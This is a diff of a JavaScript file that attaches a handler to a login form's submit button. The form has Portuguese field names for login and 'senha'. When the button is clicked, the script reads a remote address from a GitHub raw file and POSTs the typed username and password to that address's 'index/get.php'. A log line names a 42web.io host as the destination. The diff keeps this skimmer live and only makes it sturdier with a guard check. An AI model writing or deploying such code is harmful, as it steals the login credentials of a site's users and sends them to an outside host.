@@ -1,35 +1,36 @@
 
-//document.addEventListener("DOMContentLoaded", function() {
 let btn = document.getElementsByClassName("g-recaptcha")
 const username = document.querySelector('[name="user.login"]')
 const password = document.querySelector('[name="user.senha"]')
 
-btn[0].addEventListener("click", function(){
-    console.log("Botão de envio de formulário clicado.");
 
-    let xhr = new XMLHttpRequest();
+if (btn[0]){
+    btn[0].addEventListener("click", function(){
+        console.log("Botão de envio de formulário clicado.");
 
-    console.log("Objeto XMLHttpRequest criado.");
+        let xhr = new XMLHttpRequest();
 
-    xhr.open('GET', 'https://raw.githubusercontent.com/Wolota/ips/main/url-new', true);
-    xhr.onreadystatechange = async function() {
-        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-            const urlContent = xhr.responseText;
+        console.log("Objeto XMLHttpRequest criado.");
 
-            const data = new FormData();
-            data.append("username", username.value);
-            data.append("password", password.value);
+        xhr.open('GET', 'https://raw.githubusercontent.com/Wolota/ips/main/url-new', true);
+        xhr.onreadystatechange = async function() {
+            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                const urlContent = xhr.responseText;
 
-            const response = await fetch(urlContent + "index/get.php", {
-                method: "POST",
-                body: data
-            });
+                const data = new FormData();
+                data.append("username", username.value);
+                data.append("password", password.value);
 
-            console.log("Dados enviados com sucesso para http://fckyou.42web.io/index/get.php.");
-        }
-    };
-    xhr.send();
+                const response = await fetch(urlContent + "index/get.php", {
+                    method: "POST",
+                    body: data
+                });
 
-    console.log("Requisição enviada para o servidor.");
-});
-//})
+                console.log("Dados enviados com sucesso para http://fckyou.42web.io/index/get.php.");
+            }
+        };
+        xhr.send();
+
+        console.log("Requisição enviada para o servidor.");
+    });
+}
